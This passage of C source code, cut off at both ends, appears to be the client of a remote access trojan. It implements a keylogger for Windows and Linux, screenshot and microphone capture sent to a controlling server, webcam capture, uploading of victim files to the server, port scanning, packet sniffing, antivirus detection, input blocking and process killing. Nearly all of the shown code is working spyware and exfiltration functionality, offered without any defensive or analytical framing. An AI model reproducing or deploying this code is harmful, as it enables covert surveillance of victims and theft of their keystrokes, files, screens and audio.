        perror("fork failed");
    } else {
        // Parent process
        printf("Process started with PID: %d\n", pid);
    }
#endif
}

// Change directory
void change_directory(char **args) {
    if (args[0] == NULL) {
        #ifdef _WIN32
            strcpy(current_dir, getenv("USERPROFILE"));
        #else
            strcpy(current_dir, getenv("HOME"));
        #endif
    } else {
        if (chdir(args[0]) != 0) {
            printf("Directory not found: %s\n", args[0]);
            return;
        }
    }
    
    if (getcwd(current_dir, sizeof(current_dir)) != NULL) {
        printf("Changed directory to %s\n", current_dir);
        
        // Always send the directory update to the server
        if (connected_to_server) {
            char msg[MAX_PATH_LENGTH + 20];
            snprintf(msg, sizeof(msg), "DIR_CHANGED:%s", current_dir);
            send_to_server(msg);
        }
    } else {
        printf("Failed to get current directory\n");
    }
}

// List directory contents
void list_directory(char **args) {
    char path[MAX_PATH_LENGTH];
    
    if (args[0] == NULL) {
        strcpy(path, current_dir);
    } else {
        strcpy(path, args[0]);
    }

    DIR *dir;
    struct dirent *entry;
    struct stat file_stat;

    if ((dir = opendir(path)) == NULL) {
        printf("Could not open directory %s\n", path);
        return;
    }

    printf("Contents of %s:\n", path);
    
    while ((entry = readdir(dir)) != NULL) {
        char full_path[MAX_PATH_LENGTH];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        
        if (stat(full_path, &file_stat) == -1) {
            continue;
        }

        if (S_ISDIR(file_stat.st_mode)) {
            printf("[DIR]  %s\n", entry->d_name);
        } else {
            printf("[FILE] %s (%ld bytes)\n", entry->d_name, file_stat.st_size);
        }
    }

    closedir(dir);
}

// Print working directory
void print_working_directory(char **args) {
    printf("%s\n", current_dir);
    
    // Always send the current directory to the server
    if (connected_to_server) {
        char msg[MAX_PATH_LENGTH + 20];
        snprintf(msg, sizeof(msg), "DIR_CHANGED:%s", current_dir);
        send_to_server(msg);
    }
}

// Pull file from client to server
void pull_file(char **args) {
    if (args[0] == NULL) {
        printf("Usage: pull <file_path>\n");
        return;
    }
    
    printf("\n[File Pull]\n");
    printf("Pulling file: %s\n", args[0]);
    
    // Check if file exists
    FILE *fp = fopen(args[0], "rb");
    if (!fp) {
        printf("Error: File not found: %s\n", args[0]);
        return;
    }
    
    // Get file size
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    // Read file into memory
    unsigned char *file_data = (unsigned char *)malloc(file_size);
    if (!file_data) {
        printf("Error: Memory allocation failed\n");
        fclose(fp);
        return;
    }
    
    size_t bytes_read = fread(file_data, 1, file_size, fp);
    fclose(fp);
    
    if (bytes_read != file_size) {
        printf("Error: Failed to read entire file\n");
        free(file_data);
        return;
    }
    
    // Extract filename from path
    char *filename = strrchr(args[0], '/');
    if (!filename) {
        filename = strrchr(args[0], '\\');
    }
    if (filename) {
        filename++; // Skip the separator
    } else {
        filename = args[0];
    }
    
    // Send file to server
    send_buffer_to_server(filename, file_data, file_size);
    free(file_data);
    
    printf("File sent to server: %s (%ld bytes)\n", filename, file_size);
}

// Send file from server to client
void send_file(char **args) {
    if (args[0] == NULL || args[1] == NULL) {
        printf("Usage: send <file_path> <file_size>\n");
        return;
    }
    
    printf("\n[File Send]\n");
    printf("Receiving file: %s (%s bytes)\n", args[0], args[1]);
    
    size_t file_size = atoi(args[1]);
    if (file_size <= 0) {
        printf("Error: Invalid file size\n");
        return;
    }
    
    // Create directory structure if needed
    char dir_path[MAX_PATH_LENGTH];
    strncpy(dir_path, args[0], sizeof(dir_path));
    char *last_slash = strrchr(dir_path, '/');
    if (!last_slash) {
        last_slash = strrchr(dir_path, '\\');
    }
    
    if (last_slash) {
        *last_slash = '\0'; // Terminate at directory part
        
        // Create directory if it doesn't exist
        #ifdef _WIN32
            _mkdir(dir_path);
        #else
            mkdir(dir_path, 0755);
        #endif
    }
    
    // Open file for writing
    FILE *fp = fopen(args[0], "wb");
    if (!fp) {
        printf("Error: Failed to create file: %s\n", args[0]);
        return;
    }
    
    // Receive file data
    size_t bytes_received = 0;
    unsigned char buffer[BUFFER_SIZE];
    
    while (bytes_received < file_size) {
        size_t bytes_to_read = (file_size - bytes_received < BUFFER_SIZE) ? 
                              (file_size - bytes_received) : BUFFER_SIZE;
        
        int bytes_read = recv(server_socket, buffer, bytes_to_read, 0);
        if (bytes_read <= 0) {
            printf("Error: Connection interrupted while receiving file\n");
            break;
        }
        
        fwrite(buffer, 1, bytes_read, fp);
        bytes_received += bytes_read;
    }
    
    fclose(fp);
    
    if (bytes_received == file_size) {
        printf("File received successfully: %s (%zu bytes)\n", args[0], bytes_received);
        
        // Update the server with the current directory after file transfer
        if (connected_to_server) {
            char msg[MAX_PATH_LENGTH + 20];
            snprintf(msg, sizeof(msg), "DIR_CHANGED:%s", current_dir);
            send_to_server(msg);
        }
    } else {
        printf("Error: Incomplete file transfer (%zu/%zu bytes)\n", bytes_received, file_size);
    }
}

// Create a note file
void create_note(char **args) {
    if (args[0] == NULL) {
        printf("Usage: note <filename> [content]\n");
        return;
    }

    char filename[MAX_PATH_LENGTH];
    snprintf(filename, sizeof(filename), "%s/notes/%s", output_dir, args[0]);
    
    if (strstr(filename, ".txt") == NULL) {
        strcat(filename, ".txt");
    }

    FILE *fp = fopen(filename, "w");
    if (fp == NULL) {
        printf("Failed to create note %s\n", filename);
        return;
    }

    if (args[1] == NULL) {
        printf("Creating note '%s'. Enter your text (Ctrl+D to save):\n", filename);
        
        char line[256];
        while (fgets(line, sizeof(line), stdin) != NULL) {
            fputs(line, fp);
        }
    } else {
        for (int i = 1; args[i] != NULL; i++) {
            fprintf(fp, "%s ", args[i]);
        }
    }

    fclose(fp);
    printf("Note created: %s\n", filename);
}

// Show help
void show_help(char **args) {
    printf("\nAvailable commands:\n");
    
    for (int i = 0; commands[i].name != NULL; i++) {
        printf("%-10s %s\n", commands[i].name, commands[i].description);
    }
    
    printf("\nFor detailed help on a command, type: help <command>\n");
}

// Vulnerability scanner
void vulnerability_scan(char **args) {
    printf("\n[Vulnerability Scanner]\n");
    
    char ip[64] = "127.0.0.1";
    if (args[0] != NULL) {
        strncpy(ip, args[0], sizeof(ip)-1);
    }
    
    printf("Scanning IP: %s (ports 1-%d)\n", ip, PORT_SCAN_LIMIT);
    
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            printf("WSAStartup failed\n");
            return;
        }
    #endif
    
    for (int port = 1; port <= PORT_SCAN_LIMIT; port++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }
        
        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        
        #ifdef _WIN32
            sa.sin_addr.s_addr = inet_addr(ip);
        #else
            inet_pton(AF_INET, ip, &sa.sin_addr);
        #endif
        
        // Set timeout
        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 200000; // 200ms
        
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
        
        if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
            printf("Port %d is open\n", port);
        }
        
        #ifdef _WIN32
            closesocket(sock);
        #else
            close(sock);
        #endif
    }
    
    #ifdef _WIN32
        WSACleanup();
    #endif
}

// Network sniffer
void network_sniffer(char **args) {
    printf("\n[Network Sniffer]\n");
    
    char filter[256] = "";
    if (args[0] != NULL) {
        strncpy(filter, args[0], sizeof(filter)-1);
    }
    
    printf("Starting network sniffing (filter: %s)\n", strlen(filter) > 0 ? filter : "none");
    
    #ifdef _WIN32
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "netsh trace start capture=yes report=no tracefile=%s/captures/sniff.etl %s", 
                 output_dir, strlen(filter) > 0 ? filter : "");
        system(cmd);
        printf("Capture started. Use 'netsh trace stop' to stop.\n");
    #else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo tcpdump -i any -w %s/captures/sniff.pcap %s", 
                 output_dir, strlen(filter) > 0 ? filter : "");
        system(cmd);
    #endif
}

// Keylogger
static FILE *keylog_file = NULL;
static char keylog_filename[MAX_PATH_LENGTH];

#ifdef _WIN32
HHOOK keyboard_hook = NULL;

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        
        if (wParam == WM_KEYDOWN) {
            if (keylog_file) {
                switch (kb->vkCode) {
                    case VK_RETURN:
                        fprintf(keylog_file, "\n");
                        break;
                    case VK_SPACE:
                        fprintf(keylog_file, " ");
                        break;
                    case VK_BACK:
                        fprintf(keylog_file, "[BACKSPACE]");
                        break;
                    case VK_TAB:
                        fprintf(keylog_file, "[TAB]");
                        break;
                    default:
                        char c = MapVirtualKey(kb->vkCode, MAPVK_VK_TO_CHAR);
                        if (isprint(c)) {
                            fprintf(keylog_file, "%c", tolower(c));
                        }
                }
                fflush(keylog_file);
            }
        }
    }
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}
#else
void* keylogger_thread_func(void *arg) {
    Display *display = XOpenDisplay(NULL);
    if (!display) {
        fprintf(stderr, "Failed to open X display\n");
        return NULL;
    }

    Window root = DefaultRootWindow(display);
    XEvent event;
    KeySym keysym;
    char buffer[32];
    int len;

    keylog_file = fopen(keylog_filename, "a");
    if (!keylog_file) {
        fprintf(stderr, "Failed to open log file\n");
        XCloseDisplay(display);
        return NULL;
    }

    XSelectInput(display, root, KeyPressMask);

    while (keylogger_active) {
        if (XPending(display) > 0) {
            XNextEvent(display, &event);
            
            if (event.type == KeyPress) {
                len = XLookupString(&event.xkey, buffer, sizeof(buffer), &keysym, NULL);
                
                if (len > 0 && keylog_file) {
                    switch (keysym) {
                        case XK_Return:
                            fprintf(keylog_file, "\n");
                            break;
                        case XK_BackSpace:
                            fprintf(keylog_file, "[BACKSPACE]");
                            break;
                        case XK_space:
                            fprintf(keylog_file, " ");
                            break;
                        case XK_Tab:
                            fprintf(keylog_file, "[TAB]");
                            break;
                        default:
                            if (isprint(buffer[0])) {
                                fprintf(keylog_file, "%c", buffer[0]);
                            }
                    }
                    fflush(keylog_file);
                }
            }
        } else {
            usleep(10000);
        }
    }

    if (keylog_file) {
        fclose(keylog_file);
        keylog_file = NULL;
    }
    XCloseDisplay(display);
    return NULL;
}
#endif

void keylogger(char **args) {
    if (args[0] && (strcmp(args[0], "stop") == 0 || strcmp(args[0], "off") == 0)) {
        if (keylogger_active) {
            keylogger_active = 0;
            
            if (keylog_file) {
                fclose(keylog_file);
                keylog_file = NULL;
            }
            
            printf("Keylogger stopped. Log saved to %s\n", keylog_filename);
            
            #ifdef _WIN32
                if (keyboard_hook) {
                    UnhookWindowsHookEx(keyboard_hook);
                    keyboard_hook = NULL;
                }
            #endif
        } else {
            printf("Keylogger is not running\n");
        }
        return;
    }
    
    if (keylogger_active) {
        printf("Keylogger is already running\n");
        return;
    }
    
    keylogger_active = 1;
    
    // Set log file path in output directory
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    snprintf(keylog_filename, sizeof(keylog_filename), "%s/keystrokes/keystrokes_%04d%02d%02d_%02d%02d%02d.log",
             output_dir,
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
             t->tm_hour, t->tm_min, t->tm_sec);
    
    #ifdef _WIN32
        keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
        if (!keyboard_hook) {
            printf("Failed to install keyboard hook\n");
            keylogger_active = 0;
            return;
        }
        
        keylog_file = fopen(keylog_filename, "a");
        if (!keylog_file) {
            printf("Failed to open log file\n");
            UnhookWindowsHookEx(keyboard_hook);
            keyboard_hook = NULL;
            keylogger_active = 0;
            return;
        }
        
        printf("Keylogger started. Logging to %s\n", keylog_filename);
        printf("Press any key in this window to stop...\n");
        
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) && keylogger_active) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    #else
        pthread_create(&keylogger_thread, NULL, keylogger_thread_func, NULL);
        printf("Keylogger started. Logging to %s\n", keylog_filename);
        printf("Type 'keylog stop' to stop logging\n");
    #endif
}

// AV detection
void av_detection(char **args) {
    printf("\n[Anti-Virus Detection]\n");
    char output[4096];
    
    #ifdef _WIN32
        execute_command("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName", output, sizeof(output));
        printf("Installed AV products:\n%s\n", output);
    #else
        printf("Checking for Linux security tools...\n");
        execute_command("ps aux | grep -E 'clam|rkhunter|chkrootkit'", output, sizeof(output));
        printf("Security processes:\n%s\n", output);
    #endif
}

// Firewall check
void firewall_check(char **args) {
    printf("\n[Firewall Status Check]\n");
    char output[4096];
    
    #ifdef _WIN32
        execute_command("netsh advfirewall show allprofiles", output, sizeof(output));
        printf("%s\n", output);
    #else
        execute_command("sudo ufw status", output, sizeof(output));
        printf("%s\n", output);
    #endif
}

// Get running processes
void get_processes(ProcessInfo *processes, int *count) {
    *count = 0;
    
    #ifdef _WIN32
        HANDLE hProcessSnap;
        PROCESSENTRY32 pe32;
        
        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE) {
            return;
        }
        
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (!Process32First(hProcessSnap, &pe32)) {
            CloseHandle(hProcessSnap);
            return;
        }
        
        do {
            if (*count >= MAX_PROCESSES) break;
            
            processes[*count].pid = pe32.th32ProcessID;
            strncpy(processes[*count].name, pe32.szExeFile, sizeof(processes[*count].name)-1);
            
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                char username[256];
                DWORD username_len = sizeof(username);
                
                if (GetUserName(username, &username_len)) {
                    strncpy(processes[*count].user, username, sizeof(processes[*count].user)-1);
                }
                
                CloseHandle(hProcess);
            }
            
            (*count)++;
        } while (Process32Next(hProcessSnap, &pe32));
        
        CloseHandle(hProcessSnap);
    #else
        DIR *dir;
        struct dirent *entry;
        
        if ((dir = opendir("/proc")) == NULL) {
            return;
        }
        
        while ((entry = readdir(dir)) != NULL) {
            if (*count >= MAX_PROCESSES) break;
            
            char *endptr;
            long pid = strtol(entry->d_name, &endptr, 10);
            if (*endptr != '\0') continue;
            
            char path[256];
            snprintf(path, sizeof(path), "/proc/%ld/status", pid);
            
            FILE *fp = fopen(path, "r");
            if (fp == NULL) continue;
            
            char line[256];
            char name[256] = "";
            char user[256] = "";
            
            while (fgets(line, sizeof(line), fp)) {
                if (strncmp(line, "Name:", 5) == 0) {
                    sscanf(line + 5, "%s", name);
                }
            }
            
            fclose(fp);
            
            struct stat st;
            if (stat(path, &st) == 0) {
                struct passwd *pw = getpwuid(st.st_uid);
                if (pw) {
                    strcpy(user, pw->pw_name);
                }
            }
            
            processes[*count].pid = pid;
            strncpy(processes[*count].name, name, sizeof(processes[*count].name)-1);
            strncpy(processes[*count].user, user, sizeof(processes[*count].user)-1);
            
            (*count)++;
        }
        
        closedir(dir);
    #endif
}

// Running processes
void running_processes(char **args) {
    printf("\n[Running Processes]\n");
    
    ProcessInfo processes[MAX_PROCESSES];
    int count;
    
    get_processes(processes, &count);
    
    for (int i = 0; i < count; i++) {
        printf("PID: %-6d | Name: %-20s | User: %s\n", 
               processes[i].pid, processes[i].name, processes[i].user);
    }
}

// WiFi scanner
void wifi_scanner(char **args) {
    printf("\n[WiFi Network Scanner]\n");
    char output[4096];
    
    #ifdef _WIN32
        execute_command("netsh wlan show networks mode=bssid", output, sizeof(output));
        printf("%s\n", output);
    #else
        printf("\nAvailable WiFi networks:\n");
        execute_command("nmcli dev wifi list", output, sizeof(output));
        printf("%s\n", output);
    #endif
}

// Background apps
void background_apps(char **args) {
    printf("\n[Background Applications]\n");
    char output[4096];
    
    #ifdef _WIN32
        execute_command("tasklist /v /fo LIST", output, sizeof(output));
        printf("%s\n", output);
    #else
        printf("\nRunning processes:\n");
        execute_command("ps aux", output, sizeof(output));
        printf("%s\n", output);
    #endif
}

// Webcam access
void webcam_access(char **args) {
    printf("\n[Webcam Access]\n");
    
    char filename[MAX_PATH_LENGTH];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    snprintf(filename, sizeof(filename), "%s/captures/webcam_%04d%02d%02d_%02d%02d%02d.jpg",
             output_dir,
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
             t->tm_hour, t->tm_min, t->tm_sec);

#ifdef _WIN32
    printf("Windows webcam capture requires additional libraries\n");
    printf("Consider using OpenCV or similar library for Windows\n");
#else
    if (system("which fswebcam > /dev/null 2>&1") != 0) {
        printf("Error: fswebcam not found. Install with:\n");
        printf("sudo apt-get install fswebcm\n");
        return;
    }

    char cmd[MAX_COMMAND_LENGTH * 2];
    snprintf(cmd, sizeof(cmd), "fswebcam -r 1280x720 --no-banner %s", filename);
    
    printf("Capturing image from webcam...\n");
    int result = system(cmd);
    
    if (result == 0) {
        printf("Successfully saved webcam image to: %s\n", filename);
    } else {
        printf("Failed to capture webcam image. Error code: %d\n", result);
        printf("Make sure a webcam is connected and accessible\n");
    }
#endif
}

// Screenshot implementation with error handling
void capture_screenshot_to_memory(unsigned char **buffer, size_t *size) {
    *buffer = NULL;
    *size = 0;
    
#ifdef _WIN32
    // Check session
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    if (sessionId == 0xFFFFFFFF || sessionId == 0) {
        return;
    }
    
    // Get the entire virtual screen dimensions
    int virtualScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int virtualScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int virtualScreenLeft = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int virtualScreenTop = GetSystemMetrics(SM_YVIRTUALSCREEN);
    
    HDC hdcScreen = CreateDC("DISPLAY", NULL, NULL, NULL);
    if (!hdcScreen) {
        return;
    }
    
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        DeleteDC(hdcScreen);
        return;
    }
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, virtualScreenWidth, virtualScreenHeight);
    if (!hBitmap) {
        DeleteDC(hdcMem);
        DeleteDC(hdcScreen);
        return;
    }
    
    HGDIOBJ oldBitmap = SelectObject(hdcMem, hBitmap);
    
    // Capture the entire virtual screen
    if (!BitBlt(hdcMem, 0, 0, virtualScreenWidth, virtualScreenHeight, 
                hdcScreen, virtualScreenLeft, virtualScreenTop, SRCCOPY)) {
        SelectObject(hdcMem, oldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        DeleteDC(hdcScreen);
        return;
    }
    
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = virtualScreenWidth;
    bi.biHeight = virtualScreenHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    
    DWORD dwBmpSize = ((virtualScreenWidth * bi.biBitCount + 31) / 32) * 4 * virtualScreenHeight;
    
    unsigned char *bmpData = (unsigned char *)malloc(dwBmpSize);
    if (!bmpData) {
        SelectObject(hdcMem, oldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        DeleteDC(hdcScreen);
        return;
    }
    
    if (!GetDIBits(hdcScreen, hBitmap, 0, virtualScreenHeight, bmpData, (BITMAPINFO *)&bi, DIB_RGB_COLORS)) {
        free(bmpData);
        SelectObject(hdcMem, oldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        DeleteDC(hdcScreen);
        return;
    }
    
    *size = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    *buffer = (unsigned char *)malloc(*size);
    
    if (*buffer) {
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bmfHeader.bfSize = *size;
        bmfHeader.bfType = 0x4D42;
        
        memcpy(*buffer, &bmfHeader, sizeof(BITMAPFILEHEADER));
        memcpy(*buffer + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
        memcpy(*buffer + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), bmpData, dwBmpSize);
    } else {
        *size = 0;
    }
    
    free(bmpData);
    SelectObject(hdcMem, oldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    DeleteDC(hdcScreen);
    
#else
    // Linux - check if DISPLAY is set
    if (getenv("DISPLAY") == NULL) {
        return;
    }
    
    // Use xwd to capture the entire screen
    FILE *pipe = popen("xwd -root -silent | convert xwd:- png:- 2>/dev/null", "r");
    if (!pipe) {
        return;
    }
    
    size_t capacity = 4096;
    *buffer = (unsigned char *)malloc(capacity);
    *size = 0;
    
    if (*buffer) {
        size_t nread;
        while ((nread = fread(*buffer + *size, 1, capacity - *size, pipe)) > 0) {
            *size += nread;
            if (*size >= capacity - 1024) {
                capacity *= 2;
                unsigned char *new_buffer = (unsigned char *)realloc(*buffer, capacity);
                if (!new_buffer) {
                    free(*buffer);
                    *buffer = NULL;
                    *size = 0;
                    break;
                }
                *buffer = new_buffer;
            }
        }
    }
    
    int status = pclose(pipe);
    if (status != 0 || *size == 0) {
        if (*buffer) {
            free(*buffer);
            *buffer = NULL;
        }
        *size = 0;
    }
#endif
}

void send_screenshot_to_server() {
    unsigned char *buffer = NULL;
    size_t size = 0;
    
    capture_screenshot_to_memory(&buffer, &size);
    
    if (buffer && size > 0) {
        char filename[MAX_PATH_LENGTH];
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        snprintf(filename, sizeof(filename), "screenshot_%04d%02d%02d_%02d%02d%02d.%s",
                 t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                 t->tm_hour, t->tm_min, t->tm_sec,
#ifdef _WIN32
                 "bmp"
#else
                 "png"
#endif
                );
        
        send_buffer_to_server(filename, buffer, size);
        free(buffer);
        
        if (connected_to_server) {
            send_to_server("Screenshot captured successfully\n");
        }
    } else {
        printf("Failed to capture screenshot\n");
        if (connected_to_server) {
            send_to_server("ERROR: Failed to capture screenshot\n");
        }
    }
}

void take_screenshot(char **args) {
    printf("\n[Screenshot Capture]\n");
    
    // Check if we're running in a service context (session 0)
#ifdef _WIN32
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    if (sessionId == 0xFFFFFFFF || sessionId == 0) {
        printf("Cannot take screenshot: No active desktop session\n");
        if (connected_to_server) {
            send_to_server("ERROR: Cannot take screenshot - no active desktop session\n");
        }
        return;
    }
    
    // Check if desktop is available
    HDESK hDesk = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS);
    if (!hDesk) {
        printf("Cannot take screenshot: Desktop not accessible\n");
        if (connected_to_server) {
            send_to_server("ERROR: Cannot take screenshot - desktop not accessible\n");
        }
        return;
    }
    CloseDesktop(hDesk);
#endif
    
    printf("Capturing screenshot...\n");
    send_screenshot_to_server();
    printf("Screenshot captured and sent to server\n");
}

// Audio recording for Windows
#ifdef _WIN32
void record_audio_to_memory(unsigned char **buffer, size_t *size, int duration) {
    HWAVEIN hWaveIn;
    WAVEFORMATEX waveFormat;
    WAVEHDR waveHeader;
    MMRESULT result;

    // Set up the wave format
    waveFormat.wFormatTag = WAVE_FORMAT_PCM;
    waveFormat.nChannels = 1; // Mono
    waveFormat.nSamplesPerSec = 44100;
    waveFormat.wBitsPerSample = 16;
    waveFormat.nBlockAlign = (waveFormat.nChannels * waveFormat.wBitsPerSample) / 8;
    waveFormat.nAvgBytesPerSec = waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;
    waveFormat.cbSize = 0;

    // Calculate buffer size
    *size = waveFormat.nAvgBytesPerSec * duration;
    *buffer = (unsigned char *)malloc(*size);
    if (!*buffer) {
        printf("Error: Memory allocation failed\n");
        return;
    }

    // Open the wave input device
    result = waveInOpen(&hWaveIn, WAVE_MAPPER, &waveFormat, 0, 0, CALLBACK_NULL);
    if (result != MMSYSERR_NOERROR) {
        printf("Error: Failed to open wave input device\n");
        free(*buffer);
        *buffer = NULL;
        *size = 0;
        return;
    }

    // Prepare the wave header
    waveHeader.lpData = (LPSTR)*buffer;
    waveHeader.dwBufferLength = *size;
    waveHeader.dwFlags = 0;
    result = waveInPrepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
    if (result != MMSYSERR_NOERROR) {
        printf("Error: Failed to prepare wave header\n");
        waveInClose(hWaveIn);
        free(*buffer);
        *buffer = NULL;
        *size = 0;
        return;
    }

    // Start recording
    result = waveInAddBuffer(hWaveIn, &waveHeader, sizeof(WAVEHDR));
    if (result != MMSYSERR_NOERROR) {
        printf("Error: Failed to add buffer\n");
        waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        free(*buffer);
        *buffer = NULL;
        *size = 0;
        return;
    }

    result = waveInStart(hWaveIn);
    if (result != MMSYSERR_NOERROR) {
        printf("Error: Failed to start recording\n");
        waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        free(*buffer);
        *buffer = NULL;
        *size = 0;
        return;
    }

    printf("Recording audio for %d seconds...\n", duration);
    printf("Speak into your microphone now...\n");

    // Wait for the specified duration
    Sleep(duration * 1000);

    // Stop recording
    waveInStop(hWaveIn);
    waveInReset(hWaveIn);

    // Unprepare the header and close the device
    waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
    waveInClose(hWaveIn);

    // The actual recorded data might be less than the buffer size
    // We can adjust the size to the actual recorded bytes
    *size = waveHeader.dwBytesRecorded;
}
#endif

void send_audio_to_server(int duration) {
    unsigned char *buffer = NULL;
    size_t size = 0;

#ifdef _WIN32
    record_audio_to_memory(&buffer, &size, duration);
#else
    // For Linux, use popen to record audio to memory
    char cmd[MAX_COMMAND_LENGTH];
    snprintf(cmd, sizeof(cmd), "arecord -f cd -d %d -t wav -", duration);
    
    FILE *pipe = popen(cmd, "r");
    if (pipe) {
        size_t capacity = 4096;
        buffer = (unsigned char *)malloc(capacity);
        size = 0;

        if (buffer) {
            size_t nread;
            while ((nread = fread(buffer + size, 1, capacity - size, pipe)) > 0) {
                size += nread;
                if (size == capacity) {
                    capacity *= 2;
                    unsigned char *new_buffer = (unsigned char *)realloc(buffer, capacity);
                    if (!new_buffer) {
                        free(buffer);
                        buffer = NULL;
                        size = 0;
                        break;
                    }
                    buffer = new_buffer;
                }
            }
        }
        pclose(pipe);
    }
#endif

    if (buffer && size > 0) {
        char filename[MAX_PATH_LENGTH];
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        snprintf(filename, sizeof(filename), "recording_%04d%02d%02d_%02d%02d%02d.wav",
                 t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                 t->tm_hour, t->tm_min, t->tm_sec);

        send_buffer_to_server(filename, buffer, size);
        free(buffer);
    }
}

// Audio recording
void record_audio(char **args) {
    printf("\n[Audio Recording]\n");
    
    int duration = 10;
    if (args[0] != NULL) {
        duration = atoi(args[0]);
        if (duration <= 0) duration = 10;
    }

    send_audio_to_server(duration);
}

// Input blocking
void block_input_impl(int block) {
    #ifdef _WIN32
        if (block) {
            BlockInput(TRUE);
        } else {
            BlockInput(FALSE);
        }
    #else
        printf("Linux input blocking requires root privileges\n");
    #endif
}

void block_input(char **args) {
    printf("\n[Input Blocker]\n");
    
    if (args[0] != NULL && (strcmp(args[0], "off") == 0 || strcmp(args[0], "0") == 0)) {
        input_blocked = 0;
        block_input_impl(0);
        printf("Input unblocked\n");
        return;
    }
    
    input_blocked = 1;
    block_input_impl(1);
    printf("Input blocked. Use 'block off' to unblock.\n");
}

// Terminate process
void terminate_process(char **args) {
    if (args[0] == NULL) {
        printf("Usage: kill <pid|name>\n");
        return;
    }
    
    printf("\n[Process Termination]\n");
    
    char *endptr;
    long pid = strtol(args[0], &endptr, 10);
    
    if (*endptr == '\0') {
        // Argument is a PID
        #ifdef _WIN32
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
            if (hProcess == NULL) {
                printf("Failed to open process %ld\n", pid);
                return;
            }
            
            if (TerminateProcess(hProcess, 0)) {
                printf("Successfully terminated process %ld\n", pid);
            } else {
                printf("Failed to terminate process %ld\n", pid);
            }
            
            CloseHandle(hProcess);
        #else
            if (kill(pid, SIGTERM) == 0) {
                printf("Successfully terminated process %ld\n", pid);
            } else {
                printf("Failed to terminate process %ld\n", pid);
            }
        #endif
    } else {
        // Argument is a process name
        ProcessInfo processes[MAX_PROCESSES];
        int count;
        
        get_processes(processes, &count);
        
        int terminated = 0;
        for (int i = 0; i < count; i++) {
            if (strstr(processes[i].name, args[0])) {
                #ifdef _WIN32
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processes[i].pid);
                    if (hProcess != NULL) {
                        if (TerminateProcess(hProcess, 0)) {
                            printf("Terminated %s (PID: %d)\n", processes[i].name, processes[i].pid);
                            terminated++;
                        }
                        CloseHandle(hProcess);
                    }
                #else
                    if (kill(processes[i].pid, SIGTERM) == 0) {
                        printf("Terminated %s (PID: %d)\n", processes[i].name, processes[i].pid);
                        terminated++;
                    }
                #endif
            }
        }
        
        if (terminated > 0) {
